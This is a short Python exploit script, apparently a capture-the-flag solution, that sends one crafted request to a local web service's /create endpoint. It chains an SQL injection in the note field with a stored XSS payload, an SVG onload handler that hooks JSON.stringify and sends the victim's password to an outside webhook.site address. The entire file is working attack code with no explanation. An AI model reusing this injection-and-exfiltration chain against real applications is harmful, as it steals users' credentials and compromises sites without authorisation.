#!/usr/bin/env python3
import requests
url = "http://127.0.0.1:5566"
xss_payload = '<svg><svg/onload="document.querySelector=function(){JSON.stringify=a=>fetch(`https://webhook.site/11b32903-2d6a-4efc-b687-e06a0f0226aa?`+a.password),arguments.callee.caller()}">'
def send_payload():
  try:
    r = requests.post(url+"/create",json={
			"username":"hello :note",
			"password":"ryn0",
			"note":",:mode,1,1) -- +",
			"mode":f"{xss_payload}"  
    })  
    if r.status_code == 200:
      return r.json()
    else:
      print(f"[{r.status_code}] -> \n{r.text}")
    return None
  except Exception as e:
    print(e)
  
if __name__ == "__main__":
  print(send_payload())
